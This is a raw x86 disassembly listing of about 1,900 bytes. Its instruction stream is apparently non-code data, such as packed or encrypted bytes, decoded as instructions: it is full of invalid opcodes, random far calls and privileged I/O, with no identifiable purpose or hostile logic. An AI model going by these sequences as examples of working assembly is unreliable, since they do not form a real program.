  435a25:	neg    BYTE PTR [ecx]
  435a27:	sbb    BYTE PTR [ebx+0xa],0x33
  435a2b:	clc    
  435a2c:	imul   edx,DWORD PTR ds:0xe3b12986,0xffffffb7
  435a33:	shl    DWORD PTR [edx-0x554e3339],cl
  435a39:	mov    dl,0x18
  435a3b:	aas    
  435a3c:	push   esp
  435a3d:	or     ebx,DWORD PTR [ebp+0x3cbcd6e2]
  435a43:	and    DWORD PTR [ebp+0x4d54a0ef],esp
  435a49:	mov    WORD PTR ds:0x9d5b0d6a,?
  435a4f:	out    0x12,eax
  435a51:	or     ah,BYTE PTR [ebx+edi*4+0x78]
  435a55:	rdtsc  
  435a57:	mov    al,0xe9
  435a59:	cmp    eax,0xe44027bc
  435a5e:	xor    ch,dh
  435a60:	mov    dl,0x80
  435a62:	adc    edi,DWORD PTR [ebx+0x76]
  435a65:	pushf  
  435a66:	sub    eax,0xb40ba482
  435a6b:	dec    ebx
  435a6c:	inc    ebp
  435a6e:	pop    ss
  435a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435a70:	enter  0x9a5e,0xb2
  435a74:	mov    esp,0xa6d7090c
  435a79:	cmp    eax,0xe56ea732
  435a7e:	mov    WORD PTR [edx+eiz*1-0x46],ds
  435a82:	(bad)  
  435a83:	cmp    edi,ecx
  435a85:	jmp    0x435a20
  435a87:	jns    0x435a5a
  435a89:	adc    al,0xd9
  435a8b:	inc    ecx
  435a8c:	add    ch,bl
  435a8e:	fnstsw WORD PTR [edi+ebp*2+0xf]
  435a92:	inc    ebp
  435a93:	add    ah,BYTE PTR ds:0x7727b9e1
  435a99:	jbe    0x435a90
  435a9b:	repz mov dl,0x39
  435a9e:	xor    DWORD PTR [edi-0x47],ebx
  435aa1:	shr    BYTE PTR [edx-0x5df455cd],cl
  435aa7:	mov    cl,0x9e
  435aa9:	mov    ah,0x6e
  435aab:	repnz mov esp,0xc74e9af4
  435ab1:	je     0x435af2
  435ab3:	dec    esp
  435ab4:	jp     0x435b0c
  435ab6:	cdq    
  435ab7:	mov    ds:0xd6f90647,al
  435abc:	xchg   esp,eax
  435abd:	retf   0xa80f
  435ac0:	xchg   edx,eax
  435ac1:	out    dx,eax
  435ac2:	out    0xd9,eax
  435ac4:	mov    dl,0x62
  435ac6:	mov    ah,0x5d
  435ac8:	jg     0x435a64
  435aca:	sbb    DWORD PTR [ebp+0x21800b6a],eax
  435ad0:	pop    eax
  435ad1:	pop    ebp
  435ad2:	bound  esp,QWORD PTR [ebp-0x69]
  435ad5:	mov    bl,0x9a
  435ad7:	arpl   WORD PTR [ecx-0x3d],bp
  435ada:	pop    edx
  435adb:	hlt    
  435adc:	aas    
  435add:	in     eax,0x63
  435adf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435ae0:	push   cs
  435ae1:	inc    ebx
  435ae2:	aad    0x4a
  435ae4:	adc    edx,ebp
  435ae6:	jb     0x435b08
  435ae8:	int3   
  435ae9:	xchg   DWORD PTR [edx-0x112ceccf],ebx
  435aef:	cmp    ebx,eax
  435af1:	es idiv bh
  435af4:	call   DWORD PTR [edi-0x66]
  435af7:	xchg   edx,eax
  435af8:	xor    BYTE PTR [edi+0x5771abdc],dh
  435afe:	add    BYTE PTR [ecx-0x4ac1edbe],0xff
  435b05:	or     edx,esi
  435b07:	jg     0x435a8d
  435b09:	pushf  
  435b0a:	jle    0x435b61
  435b0c:	and    DWORD PTR [eax],eax
  435b0e:	call   0xa41a:0xb9aa9a4c
  435b15:	and    bl,cl
  435b17:	aam    0xcb
  435b19:	or     BYTE PTR [ebx+ebp*1-0x7f],bh
  435b1d:	dec    esp
  435b1e:	imul   cl
  435b20:	pop    ecx
  435b21:	icebp  
  435b22:	inc    edx
  435b23:	shl    dh,cl
  435b25:	push   ecx
  435b26:	call   0xb473:0xbd6098a0
  435b2d:	daa    
  435b2e:	shl    DWORD PTR [esp+eax*1+0x61200620],cl
  435b35:	(bad)  [ebp+0x9]
  435b38:	pop    ecx
  435b39:	call   0xa2befb8d
  435b3e:	sbb    cl,BYTE PTR [edi-0x5f]
  435b41:	mov    cl,0xed
  435b43:	aad    0x60
  435b45:	xor    eax,0x3b22742
  435b4a:	out    dx,al
  435b4b:	or     eax,0x2d582e43
  435b50:	mov    dl,0xc8
  435b52:	sub    ch,BYTE PTR [eax-0x39]
  435b55:	xchg   ebp,eax
  435b56:	pop    ds
  435b57:	loop   0x435ae9
  435b59:	or     esp,DWORD PTR [ecx+edx*1-0x2508fd1e]
  435b60:	dec    ecx
  435b61:	mov    WORD PTR [edx+0x410ede63],ds
  435b67:	jne    0x435bd9
  435b69:	add    al,0x23
  435b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435b6c:	and    ch,BYTE PTR [ecx+0x3]
  435b6f:	ja     0x435b71
  435b71:	bound  esp,QWORD PTR [ebx+0x4b8cb116]
  435b77:	jmp    0xb3ce:0x6716c412
  435b7e:	and    al,0xef
  435b80:	push   edi
  435b81:	out    dx,al
  435b82:	test   DWORD PTR [esi],ebp
  435b84:	jg     0x435bd1
  435b86:	mov    al,ds:0xf637f5b9
  435b8b:	lea    esi,[edx-0x54198911]
  435b91:	and    edi,DWORD PTR [ebx-0x72f4dca4]
  435b97:	psllw  mm4,QWORD PTR [edi+0x63a18481]
  435b9e:	popf   
  435b9f:	mov    bh,0x3
  435ba1:	fcomp  QWORD PTR [ebx+0xc]
  435ba4:	add    eax,0xaf35aa0e
  435ba9:	push   ds
  435baa:	push   0xffffffa6
  435bac:	mov    esi,0x2311b191
  435bb1:	dec    ebp
  435bb2:	or     eax,0x9a540073
  435bb7:	push   cs
  435bb8:	gs (bad) 
  435bba:	xor    al,0xae
  435bbc:	outs   dx,BYTE PTR ds:[esi]
  435bbd:	ret    
  435bbe:	shl    BYTE PTR [edi-0x6e0394e2],cl
  435bc4:	test   eax,0xb267171f
  435bc9:	push   ds
  435bca:	outs   dx,BYTE PTR ds:[esi]
  435bcb:	xchg   edi,eax
  435bcc:	arpl   WORD PTR [eax-0xa],di
  435bcf:	sti    
  435bd0:	dec    edi
  435bd1:	or     esi,DWORD PTR [edi+esi*1+0x6982a16f]
  435bd8:	push   0xb0ff665c
  435bdd:	sub    bl,BYTE PTR [ecx]
  435bdf:	xor    BYTE PTR [edx+0x4ce78790],bh
  435be5:	call   0x4fb:0xf199a36a
  435bec:	and    cl,bl
  435bee:	(bad)  
  435bef:	in     al,0xab
  435bf1:	add    ebx,DWORD PTR [edx+0x1084cf34]
  435bf7:	xor    ah,BYTE PTR [ecx+eiz*1]
  435bfa:	in     al,dx
  435bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435bfc:	jle    0x435bd2
  435bfe:	mov    WORD PTR [esi+0x45],es
  435c01:	or     DWORD PTR [edx+0x7e44b2d7],esi
  435c07:	xchg   ebp,eax
  435c08:	lds    ebp,FWORD PTR [ecx-0x25]
  435c0b:	and    ecx,ebp
  435c0d:	cmc    
  435c0e:	push   ebp
  435c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c10:	jae    0x435c3d
  435c12:	cmp    eax,DWORD PTR [ebx+0x4ec0d89a]
  435c18:	shl    BYTE PTR [eax],cl
  435c1a:	add    ch,cl
  435c1c:	inc    ecx
  435c1d:	imul   ebp,DWORD PTR [edi],0xffffffa7
  435c20:	lods   al,BYTE PTR ds:[esi]
  435c21:	jmp    0x302d:0x6ed9ef87
  435c28:	mov    dl,0xc2
  435c2a:	pop    eax
  435c2b:	cld    
  435c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435c2d:	xchg   esi,eax
  435c2e:	push   0xc30baa45
  435c33:	sbb    al,0x4e
  435c35:	rcl    DWORD PTR [ecx+ecx*8-0x30],1
  435c39:	rcr    DWORD PTR [ebp-0x3d5b9599],0x58
  435c40:	mov    esp,0xcc8cfba8
  435c45:	ror    BYTE PTR [ecx+0x6f],1
  435c48:	inc    edi
  435c49:	push   ss
  435c4a:	mov    WORD PTR [esi-0x6afb23a3],fs
  435c50:	sbb    al,dh
  435c52:	sub    cl,ch
  435c54:	inc    edx
  435c55:	fcmovnbe st,st(6)
  435c57:	lahf   
  435c58:	mov    ss,WORD PTR [edx+ebx*1+0x15630565]
  435c5f:	jnp    0x435c67
  435c61:	ror    BYTE PTR [edx],0x8f
  435c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c65:	ins    DWORD PTR es:[edi],dx
  435c66:	test   eax,0x21e2b2e8
  435c6b:	lds    ebx,FWORD PTR [edi+0x17]
  435c6e:	xchg   edi,eax
  435c6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435c70:	test   al,0xb7
  435c72:	xor    DWORD PTR [ebx+0x3e],ebx
  435c75:	sahf   
  435c76:	test   ebx,ecx
  435c78:	mov    dl,0x6e
  435c7a:	(bad)  
  435c7c:	adc    eax,0xc9d9a763
  435c81:	xor    eax,0x260d9fa6
  435c86:	xchg   esp,eax
  435c87:	jecxz  0x435c58
  435c89:	imul   edi,ebp,0xffffffc0
  435c8c:	out    0x4b,eax
  435c8e:	fs es or esp,edi
  435c92:	call   0xddaa:0x3ca741f5
  435c99:	mov    cl,0x59
  435c9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435c9c:	push   edx
  435c9d:	repz xor BYTE PTR ds:0x412f581,ch
  435ca4:	ins    BYTE PTR es:[edi],dx
  435ca5:	fstp   DWORD PTR [edx-0x30aa2cab]
  435cab:	xor    eax,0x4f12da1d
  435cb0:	mov    BYTE PTR [esi+0x1f],bh
  435cb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435cb4:	enter  0x9bed,0x39
  435cb8:	fwait
  435cb9:	hlt    
  435cba:	ret    
  435cbb:	fidiv  DWORD PTR [ecx+0x6bd2ffef]
  435cc1:	mov    ebp,0xb7a64fdb
  435cc6:	in     al,0x9e
  435cc8:	mov    cl,0xf6
  435cca:	inc    esi
  435ccb:	idiv   DWORD PTR [ecx-0x4d47ff3c]
  435cd1:	mov    eax,0x5f22cd7
  435cd6:	test   BYTE PTR [esi],dh
  435cd8:	xor    al,bh
  435cda:	inc    ebp
  435cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435cdc:	jb     0x435d13
  435cde:	bound  esi,QWORD PTR [ebp+0x2d]
  435ce1:	sub    BYTE PTR [ebp-0x6ef4c59],dl
  435ce7:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  435ce9:	imul   edx,DWORD PTR ss:[ecx-0x4e],0x71
  435cee:	push   0xcd3c9bad
  435cf3:	pop    ecx
  435cf4:	or     edx,DWORD PTR fs:[edi]
  435cf7:	mov    ebx,0x4993b3ed
  435cfc:	push   edx
  435cfd:	xchg   DWORD PTR [edx-0xd48949c],ebx
  435d03:	jnp    0x435cdb
  435d05:	jbe    0x435d15
  435d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d08:	outs   dx,DWORD PTR ds:[esi]
  435d09:	or     DWORD PTR [ecx-0x5c],0x10
  435d0d:	popf   
  435d0e:	mov    cl,0x42
  435d10:	mov    bl,BYTE PTR [ecx+0x7353a767]
  435d16:	push   edx
  435d17:	pop    ecx
  435d18:	(bad)  [ecx-0x31d15854]
  435d1e:	ins    BYTE PTR es:[edi],dx
  435d1f:	fwait
  435d20:	add    ecx,0x64cb18b8
  435d26:	test   dl,dh
  435d28:	jp     0x435d99
  435d2a:	sbb    bl,BYTE PTR [ecx-0x3df1e56b]
  435d30:	mov    ecx,0x2ca0f80b
  435d35:	inc    ecx
  435d36:	add    BYTE PTR [eax-0xe],bl
  435d39:	jmp    DWORD PTR [ebp+0x49b00e3a]
  435d3f:	daa    
  435d40:	mov    eax,0x1b1e3f4c
  435d45:	and    esp,DWORD PTR [ebx+0x2edaf0a9]
  435d4b:	and    al,0x92
  435d4d:	leave  
  435d4e:	lods   eax,DWORD PTR ds:[esi]
  435d4f:	xor    al,0xbc
  435d51:	je     0x435ced
  435d53:	mov    al,ds:0x46d7a6b0
  435d58:	push   ecx
  435d59:	out    dx,al
  435d5a:	sub    eax,0x2445d3a6
  435d5f:	sub    eax,0xc7387e8a
  435d64:	mov    ebp,0x45df9ae5
  435d69:	fadd   st,st(7)
  435d6b:	dec    esp
  435d6c:	jno    0x435cfc
  435d6e:	lahf   
  435d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d70:	sbb    al,0x2e
  435d72:	out    dx,al
  435d73:	std    
  435d74:	mov    cl,0x45
  435d76:	rcr    ecx,cl
  435d78:	mov    cl,0x65
  435d7a:	ret    0x5343
  435d7d:	ja     0x435d6e
  435d7f:	das    
  435d80:	gs mov bl,0x10
  435d83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435d84:	mov    bh,0x48
  435d86:	js     0x435d12
  435d88:	sahf   
  435d89:	xchg   edx,eax
  435d8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435d8b:	es mov bl,0xe8
  435d8e:	mov    ah,0x99
  435d90:	add    DWORD PTR [edx],0x7f
  435d93:	pop    ss
  435d94:	jb     0x435e14
  435d96:	xor    BYTE PTR [edi+0x63fbe18f],ah
  435d9c:	hlt    
  435d9d:	outs   dx,BYTE PTR ds:[esi]
  435d9e:	fisttp DWORD PTR [edx+esi*4-0x24]
  435da2:	dec    edi
  435da3:	fld    DWORD PTR [esi-0x5a]
  435da6:	adc    al,0x36
  435da8:	xchg   edx,eax
  435da9:	or     al,0x64
  435dab:	test   DWORD PTR [edi-0x8],0xa99f223
  435db2:	aaa    
  435db3:	mov    ds:0x674c7a83,eax
  435db8:	out    dx,eax
  435db9:	shr    al,cl
  435dbb:	jb     0x435d6f
  435dbd:	inc    edx
  435dbe:	mov    eax,ds:0x3aaab560
  435dc3:	test   al,0xd3
  435dc5:	or     ecx,ecx
  435dc7:	out    dx,eax
  435dc8:	push   0x54
  435dca:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435dcc:	in     al,dx
  435dcd:	pop    edx
  435dce:	je     0x435e3b
  435dd0:	mov    bl,0x7c
  435dd2:	add    DWORD PTR [esi+esi*2+0x6c],ebp
  435dd6:	mov    ebx,0xc36a824f
  435ddb:	lods   al,BYTE PTR ds:[esi]
  435ddc:	out    0xb8,al
  435dde:	mov    esi,0xd7db32a2
  435de3:	cdq    
  435de4:	imul   ecx,DWORD PTR [ebp-0x66],0x2b01e22
  435deb:	js     0x435e2f
  435ded:	scas   al,BYTE PTR es:[edi]
  435dee:	cmp    ah,BYTE PTR [esi+0xc9007d9]
  435df4:	dec    ebp
  435df5:	test   al,0xb2
  435df7:	popa   
  435df8:	push   ecx
  435df9:	mov    edi,0xe70f9c4b
  435dfe:	cwde   
  435dff:	aam    0xb2
  435e01:	ja     0x435dff
  435e03:	jmp    0x435e1c
  435e05:	pop    eax
  435e06:	mov    bh,0xb0
  435e08:	push   es
  435e09:	or     esp,DWORD PTR [eax]
  435e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e0c:	addr16 mov eax,ds:0xfe57
  435e10:	pop    esi
  435e11:	out    0x9a,al
  435e13:	iret   
  435e14:	sub    al,0x5d
  435e16:	(bad)  [edx]
  435e18:	mov    edi,0x55b9fba8
  435e1d:	sbb    BYTE PTR ds:0xc353227,al
  435e23:	push   ds
  435e24:	aad    0x19
  435e26:	push   0x77
  435e28:	mov    ebx,0xa3214865
  435e2d:	or     esi,eax
  435e2f:	lods   eax,DWORD PTR ds:[esi]
  435e30:	and    cl,dh
  435e32:	outs   dx,BYTE PTR ds:[esi]
  435e33:	push   ebp
  435e34:	and    eax,0xd8a3980b
  435e39:	mov    bh,0xaf
  435e3b:	shl    DWORD PTR [eax],cl
  435e3d:	lods   eax,DWORD PTR ds:[esi]
  435e3e:	xchg   esp,eax
  435e3f:	jl     0x435e24
  435e41:	and    eax,0x8cf5ee04
  435e46:	bound  ebx,QWORD PTR [ebp-0x5e]
  435e49:	add    edi,DWORD PTR [edi+0x7f0b1662]
  435e4f:	std    
  435e50:	dec    ebx
  435e51:	inc    ebp
  435e52:	sahf   
  435e53:	popf   
  435e54:	jle    0x435dfe
  435e56:	mov    al,ds:0xe1165bd5
  435e5b:	pushf  
  435e5c:	xor    dl,BYTE PTR [esi]
  435e5e:	xor    BYTE PTR [edx],bh
  435e60:	pop    ss
  435e61:	adc    eax,ecx
  435e63:	aad    0x47
  435e65:	xor    eax,0x90affb9c
  435e6a:	sar    BYTE PTR [edx+0x36],0xb
  435e6e:	lock fwait
  435e70:	repnz adc eax,0xccb2a38e
  435e76:	fdiv   DWORD PTR [eax+0x79c5e4f7]
  435e7c:	pushf  
  435e7d:	or     esp,edi
  435e7f:	inc    esi
  435e80:	pop    ecx
  435e81:	nop
  435e82:	sbb    bl,BYTE PTR [ebx+ecx*2-0xe1c7a06]
  435e89:	pop    ebx
  435e8a:	sbb    bh,BYTE PTR [ecx-0x590ffd3f]
  435e90:	aas    
  435e91:	or     ebx,esp
  435e93:	adc    BYTE PTR [edi-0x49],dh
  435e96:	arpl   WORD PTR [ecx],bx
  435e98:	mov    edi,0xdef09b38
  435e9d:	test   al,0xea
  435e9f:	dec    edx
  435ea0:	xchg   edx,eax
  435ea1:	push   ecx
  435ea2:	pop    esi
  435ea3:	ss aaa 
  435ea5:	or     ecx,DWORD PTR [edx-0x1]
  435ea8:	jp     0x435ea6
  435eaa:	test   al,0x1b
  435eac:	jecxz  0x435e83
  435eae:	test   ah,bl
  435eb0:	adc    eax,0xc744d912
  435eb5:	jmp    0x435e39
  435eb7:	aaa    
  435eb8:	je     0x435e70
  435eba:	sub    al,0x9d
  435ebc:	cmp    ecx,ecx
  435ebe:	add    eax,0x318be61f
  435ec3:	mov    ch,0x68
  435ec5:	sbb    esi,DWORD PTR [esp+eax*1]
  435ec8:	mov    dl,0xf8
  435eca:	sub    ebx,DWORD PTR [edi+0x12]
  435ecd:	push   cs
  435ece:	xlat   BYTE PTR ds:[ebx]
  435ecf:	imul   ebp,esp,0xb
  435ed2:	stc    
  435ed3:	dec    ecx
  435ed4:	shl    BYTE PTR [ecx+0x35d8bdc0],0x9a
  435edb:	test   dl,bl
  435edd:	push   esi
  435ede:	xor    eax,0x8f8652c2
  435ee3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435ee4:	and    eax,0xd9d0ddf1
  435ee9:	aas    
  435eea:	add    cl,BYTE PTR [ecx+0x4821f9b2]
  435ef0:	les    esi,FWORD PTR [edi]
  435ef2:	cmp    eax,0x4c334ff9
  435ef7:	add    al,0x32
  435ef9:	out    dx,eax
  435efa:	das    
  435efb:	add    eax,0x7de6e7aa
  435f00:	mov    dl,0xe8
  435f02:	(bad)  
  435f03:	(bad)  
  435f04:	cwde   
  435f05:	or     DWORD PTR [esi-0x57],esp
  435f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435f09:	or     ebp,DWORD PTR [ebx+0x42eb9053]
  435f0f:	add    al,0xa0
  435f11:	dec    ebp
  435f12:	call   0xeb69:0xfa22d5de
  435f19:	enter  0x9e06,0x7b
  435f1d:	test   DWORD PTR [edx],ebx
  435f1f:	xabort 0xb0
  435f22:	test   al,0x34
  435f24:	adc    al,0x4c
  435f26:	popf   
  435f27:	mov    eax,ds:0x4cd58032
  435f2c:	repnz adc al,0xc0
  435f2f:	push   ecx
  435f30:	push   esp
  435f31:	bts    DWORD PTR [edi],ecx
  435f34:	xor    BYTE PTR [edx],0x45
  435f37:	daa    
  435f38:	dec    edi
  435f39:	jae    0x435f48
  435f3b:	cli    
  435f3c:	mov    dl,0xc0
  435f3e:	ins    DWORD PTR es:[edi],dx
  435f3f:	imul   edi,eax,0xf6ce7715
  435f45:	jbe    0x435f72
  435f47:	rcr    DWORD PTR [ecx-0x68be33fc],cl
  435f4d:	scas   eax,DWORD PTR es:[edi]
  435f4e:	out    0x67,al
  435f50:	or     ebp,ebx
  435f52:	mov    esp,0xa043040d
  435f57:	sar    ecx,cl
  435f59:	or     edi,DWORD PTR [ebx-0x15c73519]
  435f5f:	bound  eax,QWORD PTR [ebx+0x26a5250b]
  435f65:	mov    ss,edi
  435f67:	mov    bh,0x9b
  435f69:	dec    esp
  435f6a:	call   0x64c2:0xcdde3245
  435f71:	fsubr  DWORD PTR [edx]
  435f73:	mov    eax,0x26747c1e
  435f78:	inc    esp
  435f79:	les    ecx,FWORD PTR [eax-0x5f]
  435f7c:	mov    dh,0xc3
  435f7e:	pop    edi
  435f7f:	ja     0x435f31
  435f81:	mov    ch,0x91
  435f83:	jge    0x435fa2
  435f85:	add    BYTE PTR [edi+0x27],0x5b
  435f89:	es pop ecx
  435f8b:	retf   0xb14
  435f8e:	out    0x53,eax
  435f90:	jp     0x435fab
  435f92:	xor    ch,BYTE PTR [edi-0x796239f2]
  435f98:	(bad)  
  435f99:	lock dec ebx
  435f9b:	xor    al,0x12
  435f9d:	mov    ebx,0xb1ea672
  435fa2:	cmp    cl,BYTE PTR [edx+ecx*4]
  435fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435fa6:	jge    0x435ffe
  435fa8:	and    edx,DWORD PTR [eax-0x67]
  435fab:	cmc    
  435fac:	sbb    BYTE PTR [ebx+0x75],0xb3
  435fb0:	fwait
  435fb1:	mov    ebx,0x5c0d2d8
  435fb6:	ret    
  435fb7:	retf   0xb4ac
  435fba:	mov    edx,0x2f09b760
  435fbf:	sbb    esi,DWORD PTR [edx+0x6c492e26]
  435fc5:	mov    cs,WORD PTR [ecx+0x59e7d32f]
  435fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435fcc:	add    al,0xae
  435fce:	mov    edi,0xfe941a00
  435fd3:	ja     0x435fa3
  435fd5:	sub    BYTE PTR [ebp+0x299eb670],dl
  435fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435fdc:	es or  al,0xce
  435fdf:	dec    esi
  435fe0:	mov    edi,0x4e3f5f0b
  435fe5:	(bad)  
  435fe6:	fbld   TBYTE PTR [edx-0x2965119e]
  435fec:	or     esp,DWORD PTR [esi+0x5]
  435fef:	ds retf 
  435ff1:	fidiv  WORD PTR [edx+eiz*4+0xe8c019b]
  435ff8:	sbb    DWORD PTR [ebx-0x70f7d1c1],ecx
  435ffe:	fwait
  435fff:	aaa    
  436000:	xor    al,0xc6
  436002:	jne    0x43601c
  436004:	xor    DWORD PTR [esi+0xb6315fa],esp
  43600a:	scas   al,BYTE PTR es:[edi]
  43600b:	and    dh,BYTE PTR [esp+ebx*2+0x1a848e7a]
  436012:	call   0xff8d:0x85bac404
  436019:	ret    
  43601a:	jnp    0x435fc3
  43601c:	jge    0x436026
  43601e:	sldt   WORD PTR [edi+ebx*4+0x46]
  436023:	fbstp  TBYTE PTR [edx+0x630c41b1]
  436029:	cmp    eax,0xb87b450
  43602e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43602f:	mov    fs,ebx
  436031:	sbb    ch,BYTE PTR [edi+ecx*1]
  436034:	push   edx
  436035:	sub    esi,esp
  436037:	dec    eax
  436038:	mov    dl,0xdb
  43603a:	not    ah
  43603c:	in     eax,0xb4
  43603e:	popa   
  43603f:	stos   BYTE PTR es:[edi],al
  436040:	scas   eax,DWORD PTR es:[edi]
  436041:	stos   DWORD PTR es:[edi],eax
  436042:	adc    al,0x93
  436044:	ins    DWORD PTR es:[edi],dx
  436045:	or     ebx,DWORD PTR ds:0xc9319d06
  43604b:	pop    ebp
  43604c:	jp     0x4360ae
  43604e:	call   0xf455:0x25b30090
  436055:	imul   edx,esi,0x3ead1aa7
  43605b:	shl    BYTE PTR [ebx+0x30],1
  43605e:	aad    0xcc
  436060:	mov    dl,0x85
  436062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436063:	add    al,0x32
  436065:	lea    ebp,[edi]
  436067:	or     bh,BYTE PTR [ecx+0x5990d20c]
  43606d:	and    DWORD PTR [esi],esi
  43606f:	push   es
  436070:	push   es
  436071:	into   
  436072:	lods   al,BYTE PTR ds:[esi]
  436073:	pop    edi
  436074:	(bad)  
  436075:	fild   WORD PTR [ebp-0x25062b6d]
  43607b:	xchg   edx,eax
  43607c:	dec    ebp
  43607d:	in     eax,dx
  43607e:	jge    0x4360b8
  436080:	lahf   
  436081:	or     ecx,DWORD PTR [ebx-0x49]
  436084:	jnp    0x4360f0
  436086:	aas    
  436087:	jo     0x43609a
  436089:	push   0x2b7f699a
  43608e:	into   
  43608f:	test   DWORD PTR [esi-0x102c01f2],esp
  436095:	or     ecx,DWORD PTR [eax]
  436097:	sub    al,BYTE PTR [eax+0x71bcf406]
  43609d:	daa    
  43609e:	and    ch,BYTE PTR [esi+0x73d5d2b2]
  4360a4:	adc    eax,0xfc2bf31b
  4360a9:	icebp  
  4360aa:	sub    DWORD PTR [ecx+ecx*8-0x4ae2f574],esp
  4360b1:	test   BYTE PTR [edx+0x6a],ch
  4360b4:	les    esp,FWORD PTR [eax]
  4360b6:	mov    bh,0xcc
  4360b8:	inc    edi
  4360b9:	std    
  4360ba:	es sahf 
  4360bc:	inc    esp
  4360bd:	or     ecx,DWORD PTR [ebp+ebp*4-0x5515c0a7]
  4360c4:	bound  edi,QWORD PTR ds:0x6b6bfc9a
  4360ca:	bound  esp,QWORD PTR [ebp-0x58b4b54d]
  4360d0:	or     dl,BYTE PTR [ecx+0x42e79c30]
  4360d6:	test   BYTE PTR [ecx],al
  4360d8:	mov    dl,0x1e
  4360da:	mov    fs,WORD PTR [ebx+0x4c]
  4360dd:	jns    0x4360d4
  4360df:	test   DWORD PTR [ecx+0xb],0xbebef510
  4360e6:	pop    ds
  4360e7:	sbb    ebx,DWORD PTR [esi-0x7e]
  4360ea:	call   0x28fa:0xd230f549
  4360f1:	mov    ah,0x3f
  4360f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4360f4:	cld    
  4360f5:	pusha  
  4360f6:	scas   eax,DWORD PTR es:[edi]
  4360f7:	(bad)  
  4360f9:	daa    
  4360fa:	jno    0x436164
  4360fc:	mov    dl,0x12
  4360fe:	lock cmc 
  436100:	xchg   BYTE PTR [ebp+0x8023d92],al
  436106:	xchg   ebp,eax
  436107:	sub    eax,DWORD PTR [esp+ebp*2-0x2b]
  43610b:	or     ch,BYTE PTR [edx]
  43610d:	out    dx,eax
  43610e:	fwait
  43610f:	mov    bh,0x5e
  436111:	inc    edi
  436112:	mov    WORD PTR [ebp+0x7e],es
  436115:	sbb    DWORD PTR [ebx+0x480d8f7c],0x722e4634
  43611f:	inc    edi
  436120:	adc    BYTE PTR [ebx-0x713d46ba],0xf2
  436127:	addr16 cli 
  436129:	dec    ebx
  43612a:	bound  esi,QWORD PTR [ebx-0x62]
  43612d:	ret    0x769d
  436130:	test   DWORD PTR [esi-0x709d39c0],edi
  436136:	clc    
  436137:	pusha  
  436138:	jle    0x436144
  43613a:	shr    DWORD PTR [ecx+ebp*1],1
  43613d:	fwait
  43613e:	retf   0xea98
  436141:	retf   
  436142:	cmp    eax,0xf4abb291
  436147:	mov    WORD PTR [ebx+0x2bf9a997],fs
  43614d:	or     ebx,DWORD PTR [esi-0x378aa9ea]
  436153:	ret    0x5013
  436156:	call   0x976:0xf8941cb9
  43615d:	or     dh,BYTE PTR [ebx]
  43615f:	cwde   
  436160:	dec    ebx
  436161:	pop    ebp
  436162:	sbb    dl,BYTE PTR [eax]
  436164:	cmp    eax,0x838a4d86
  436169:	pop    ds
  43616a:	call   0x316b:0x5f00644f
  436171:	adc    DWORD PTR [edi+eiz*4-0x7c],ebx
  436175:	sbb    al,0x9b
  436177:	push   eax
  436178:	retf   
  436179:	mov    ebx,0xc18dd1ed
  43617e:	in     al,0xa7
  436180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  436181:	pop    edx
  436182:	test   al,0x1e
  436184:	inc    eax
  436185:	mov    edi,DWORD PTR [edi-0x687a7c59]
  43618b:	jne    0x43618a
  43618d:	aad    0x3f
  43618f:	sub    bh,BYTE PTR [ebp-0x1abc0d2e]
  436195:	jmp    0x4361e8
  436197:	or     edi,DWORD PTR [ebp-0x17be3a17]
  43619d:	or     ecx,DWORD PTR [eax]
  43619f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4361a0:	lea    esi,[ebx]
  4361a2:	int3   
  4361a3:	xlat   BYTE PTR ds:[ebx]
  4361a4:	dec    edi
  4361a5:	xchg   ecx,eax
  4361a6:	add    al,BYTE PTR [eax+ecx*2]
  4361a9:	clc    
  4361aa:	cdq    
  4361ab:	das    
  4361ac:	adc    bh,bh
  4361ae:	mov    ds:0xf1fb9ded,eax
  4361b3:	popf   
  4361b4:	xchg   ecx,eax
  4361b5:	or     edx,esp
  4361b7:	inc    esi
  4361b8:	jnp    0x4361bf
  4361ba:	(bad)  
  4361bb:	clc    
  4361bc:	lods   eax,DWORD PTR ds:[esi]
  4361bd:	cmp    ebx,DWORD PTR [edx+0x47957d2f]
  4361c3:	sbb    bh,0x50
  4361c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4361c8:	pop    ss
  4361c9:	pop    esi
  4361ca:	shl    ah,0xde
  4361cd:	popf   
  4361ce:	xchg   esp,eax
  4361cf:	xchg   esi,eax
  4361d0:	mov    cl,0x1
  4361d2:	pop    ebx
  4361d3:	jb     0x436173
  4361d5:	inc    ebp
  4361d6:	cmp    al,0x6f
  4361d8:	ret    0x5f09
  4361db:	scas   al,BYTE PTR es:[edi]
  4361dc:	fst    QWORD PTR [esp+eiz*2+0x42]
  4361e0:	xor    bh,BYTE PTR [eax]
